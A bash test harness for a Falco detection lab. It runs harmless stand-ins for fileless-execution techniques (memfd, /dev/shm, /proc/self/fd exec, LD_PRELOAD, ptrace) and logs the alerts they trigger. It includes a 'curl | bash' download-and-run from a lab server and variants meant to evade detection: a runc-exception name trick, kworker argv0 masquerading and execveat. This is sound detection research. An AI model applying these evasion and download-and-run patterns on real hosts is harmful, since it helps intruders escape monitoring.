#!/usr/bin/env bash
# run_e1.sh v3 - chay tu falco_lab_containers/:  sudo REPS=5 ./run_e1.sh
#   RULESET=default|custom  (nhan; E1 co so = default, KHONG nap custom_rules.yaml)
#   TECHS="memfd shm_host ..."  chi chay mot so ky thuat
# Moi lan chay: dung lai container sach (tranh copy-up/nhieu cheo), lap xen ky thuat theo vong rep.
# shm_ctr = /dev/shm mac dinh cua Docker (noexec -> ky vong blocked); shm_ctr_exec = container rieng voi /dev/shm exec.
# Cuoi lan chay (ke ca khi Ctrl+C): chup phan events.json va audit.log sinh ra trong lan chay vao $OUT
#   (falco_events.json, audit.log) de parse lai sau nay khong phu thuoc log xoay vong.
set -u
cd "$(dirname "$0")"
REPS=${REPS:-5}; WAIT=${WAIT:-5}; GAP=${GAP:-3}; RULESET=${RULESET:-default}
TECHS=${TECHS:-"memfd shm_host shm_ctr shm_ctr_exec procfd_link procfd_nolink procfd_drop python curl preload ptrace"}
FJ=/var/log/falco/events.json; AL=/var/log/audit/audit.log
[ "$(id -u)" -eq 0 ] || { echo "can sudo"; exit 1; }
[ -x ./labctl.sh ] || { echo "chay trong thu muc co labctl.sh"; exit 1; }
[ -f "$FJ" ] || { echo "thieu $FJ (bat json_output + file_output)"; exit 1; }
# nhan ruleset phai khop voi rule dang nap (default = rules.d rong)
RD=$(ls -A /etc/falco/rules.d 2>/dev/null)
if [ "$RULESET" = default ] && [ -n "$RD" ]; then echo "RULESET=default nhung rules.d co: $RD"; exit 1; fi
if [ "$RULESET" != default ] && [ -z "$RD" ]; then echo "RULESET=$RULESET nhung rules.d rong"; exit 1; fi
OUT=results/e1_${RULESET}_$(date +%Y%m%d_%H%M%S)${TAG:+_$TAG}; mkdir -p "$OUT"

{ echo "ruleset=$RULESET"; echo "run_id=$(basename "$OUT")"; echo "reps=$REPS wait=$WAIT gap=$GAP techs=$TECHS"
  falco --version | head -1; uname -r; runc --version | head -1; containerd --version
  docker version --format 'docker={{.Server.Version}}'
  echo "falcoctl-artifact-follow=$(systemctl is-active falcoctl-artifact-follow)"
  echo "rule_matching=$(sed -n 's/^rule_matching: *//p' /etc/falco/config.d/98-lab-rule-matching.yaml 2>/dev/null | grep . || echo 'first (mac dinh)')"
  sha256sum /etc/falco/falco.yaml /etc/falco/falco_rules.yaml /etc/falco/falco_rules.local.yaml /etc/falco/config.d/* \
    /etc/audit/rules.d/*.rules /etc/falco/rules.d/* run_e1.sh parse_e1.py labctl.sh 2>/dev/null
  for i in falco-lab-server falco-lab-target falco-lab-client; do docker image inspect "$i:latest" --format "image $i {{.Id}}"; done
  auditctl -l; docker network inspect falco-lab --format 'Internal={{.Internal}}'; } > "$OUT/versions.txt" 2>&1
auditctl -s > "$OUT/audit_status_start.txt"

run_memfd(){ docker exec falco-lab-target python3 -c "import os; fd=os.memfd_create('falco_benign_memfd'); os.write(fd, open('/bin/echo','rb').read()); os.execve(fd, ['falco_memfd_py','$1'], {})"; }
run_shm_host(){ local p=/dev/shm/falco_shm_test_$$; cp /bin/echo "$p"; "$p" "$1"; local rc=$?; rm -f "$p"; return $rc; }
run_shm_ctr(){ docker exec falco-lab-target bash -c 'cp /bin/echo /dev/shm/falco_shm_test && /dev/shm/falco_shm_test "$1"; rc=$?; rm -f /dev/shm/falco_shm_test; exit $rc' _ "$1"; }
run_shm_ctr_exec(){ docker rm -f falco-lab-shmexec >/dev/null 2>&1; docker run --rm --name falco-lab-shmexec --network falco-lab --tmpfs /dev/shm:rw,exec,nosuid,nodev falco-lab-target \
  bash -c 'cp /bin/echo /dev/shm/falco_shm_test && /dev/shm/falco_shm_test "$1"; rc=$?; rm -f /dev/shm/falco_shm_test; exit $rc' _ "$1"; }
run_procfd_link(){ docker exec falco-lab-target /usr/local/bin/procfd_exec_test; }
run_procfd_nolink(){ docker exec falco-lab-target bash -c 'exec 3</bin/echo; exec /proc/self/fd/3 "$1"' _ "$1"; }
run_procfd_drop(){ docker exec falco-lab-target bash -c 'cp /bin/echo /tmp/dropped_elf && exec 3</tmp/dropped_elf && rm /tmp/dropped_elf && exec /proc/self/fd/3 "$1"' _ "$1"; }
run_python(){ docker exec falco-lab-target /usr/local/bin/python3 -c "print('FALCO_PYTHON_MEMORY_TEST $1')"; }
run_curl(){ docker exec falco-lab-client bash -c 'set -o pipefail; curl -fsS "http://falco-lab-server:8000/test.sh#$1" | bash' _ "$1"; }
run_preload(){ docker exec -e LD_PRELOAD=/usr/local/lib/libpreload_test.so falco-lab-target /bin/echo FALCO_PRELOAD_EXEC "$1"; }
run_ptrace(){ docker exec falco-lab-target python3 -c "import ctypes,os,subprocess,time
l=ctypes.CDLL(None,use_errno=True)
p=subprocess.Popen(['sleep','5']); time.sleep(0.3)
print('attach rc=',l.ptrace(16,p.pid,0,0),'$1')
os.waitpid(p.pid,0); l.ptrace(17,p.pid,0,0); p.kill()"; }

# ---- DEV: bien the bypass ngoai le runc cua rule memfd default (DA dung khi thiet ke rule LAB memfd masquerading)
run_dev_memfd_runcname(){ docker exec falco-lab-target python3 -c "import os,sys
fd=os.memfd_create('runc_cloned:/proc/self/exe'); os.write(fd,open('/bin/echo','rb').read()); os.execve(fd,['x',sys.argv[1]],{})" "$1"; }

# ---- E4: bien the GIU RIENG (khong dung khi thiet ke custom rule). Chay bang:
#   TECHS="e4_memfd_execveat e4_procfd_argv0 e4_shm_argv0 e4_python_stdin e4_curl_script e4_curl_sh e4_preload_env"
run_e4_memfd_execveat(){ docker exec falco-lab-target python3 -c "import ctypes,os,sys
l=ctypes.CDLL(None,use_errno=True); fd=os.memfd_create('e4_memfd'); os.write(fd,open('/bin/echo','rb').read())
a=(ctypes.c_char_p*3)(b'e4_memfd',sys.argv[1].encode(),None); e=(ctypes.c_char_p*1)(None)
l.syscall(322,fd,b'',a,e,0x1000); print('execveat failed',ctypes.get_errno()); sys.exit(1)" "$1"; }
run_e4_procfd_argv0(){ docker exec falco-lab-target python3 -c "import os,sys
fd=os.open('/bin/echo',os.O_RDONLY); os.set_inheritable(fd,True); os.execv(f'/proc/self/fd/{fd}',['innocuous',sys.argv[1]])" "$1"; }
run_e4_shm_argv0(){ docker rm -f falco-lab-shmexec >/dev/null 2>&1; docker run --rm --name falco-lab-shmexec --network falco-lab --tmpfs /dev/shm:rw,exec,nosuid,nodev falco-lab-target \
  bash -c 'cp /bin/echo /dev/shm/falco_shm_test && (exec -a kworker /dev/shm/falco_shm_test "$1"); rc=$?; rm -f /dev/shm/falco_shm_test; exit $rc' _ "$1"; }
run_e4_python_stdin(){ printf "print('FALCO_E4_PY_STDIN %s')\n" "$1" | docker exec -i falco-lab-target python3 -; }
run_e4_curl_script(){ docker exec falco-lab-client bash -c 'printf "%s\n" "set -o pipefail; curl -fsS \"http://falco-lab-server:8000/test.sh#$1\" | bash" > /tmp/dl.sh && bash /tmp/dl.sh' _ "$1"; }
run_e4_curl_sh(){ docker exec falco-lab-client bash -c 'set -o pipefail; curl -fsS "http://falco-lab-server:8000/test.sh#$1" | sh' _ "$1"; }
run_e4_preload_env(){ docker exec falco-lab-target env LD_PRELOAD=/usr/local/lib/libpreload_test.so /bin/echo FALCO_PRELOAD_EXEC "$1"; }

for t in $TECHS; do declare -F "run_$t" >/dev/null || { echo "ky thuat la: $t"; exit 1; }; done

# vi tri (inode, kich thuoc) cua log luc bat dau; slice lay phan moi, ke ca khi file da xoay vong 1 lan
mark(){ stat -c '%i %s' "$1"; }
slice(){ local ino=${2% *} sz=${2#* } old
  if [ "$(stat -c %i "$1")" = "$ino" ]; then tail -c +$((sz+1)) "$1"
  else old=$(find "$(dirname "$1")" -maxdepth 1 -inum "$ino" | head -1)
       if [ -n "$old" ]; then tail -c +$((sz+1)) "$old"; else echo "[!] $1 xoay vong >1 lan, thieu du lieu" >&2; fi
       cat "$1"; fi > "$3"; }
FJ0=$(mark "$FJ"); AL0=$(mark "$AL")

# thu thoi diem NHAN alert theo dong ho host (do tre alert, khong phu thuoc dong ho Falco)
tail -n0 -F "$FJ" 2>/dev/null | python3 -u -c 'import sys,time
for l in sys.stdin: sys.stdout.write("%d\t%s"%(time.time_ns()//1000000,l))' > "$OUT/falco_rx.log" &
finish(){ pkill -f "tail -n0 -F $FJ" 2>/dev/null
  slice "$FJ" "$FJ0" "$OUT/falco_events.json"; slice "$AL" "$AL0" "$OUT/audit.log"; auditctl -s > "$OUT/audit_status_end.txt"
  echo "Snapshot log -> $OUT/falco_events.json, $OUT/audit.log"; }
trap finish EXIT

echo "technique,rep,start_ms,end_ms,exit_code,token,audit_lost_delta" > "$OUT/runs.csv"
n=$(echo $TECHS | wc -w); echo "$((REPS*n)) lan chay (~$((REPS*n*(6+WAIT+GAP)/60)) phut)"
for r in $(seq 1 "$REPS"); do
  for t in $TECHS; do
    ./labctl.sh up >/dev/null 2>&1; sleep 6
    tok="${t}_r${r}_$(date +%s)"
    l0=$(auditctl -s | awk '/^lost/{print $2}')
    s=$(date +%s%3N)
    "run_$t" "$tok" > "$OUT/${t}_${r}.out" 2>&1; rc=$?
    sleep "$WAIT"; e=$(date +%s%3N)
    l1=$(auditctl -s | awk '/^lost/{print $2}')
    echo "$t,$r,$s,$e,$rc,$tok,$((l1-l0))" >> "$OUT/runs.csv"
    echo "[$t #$r] exit=$rc lost+=$((l1-l0))"
    sleep "$GAP"
  done
done
echo "Xong -> sudo python3 parse_e1.py $OUT"
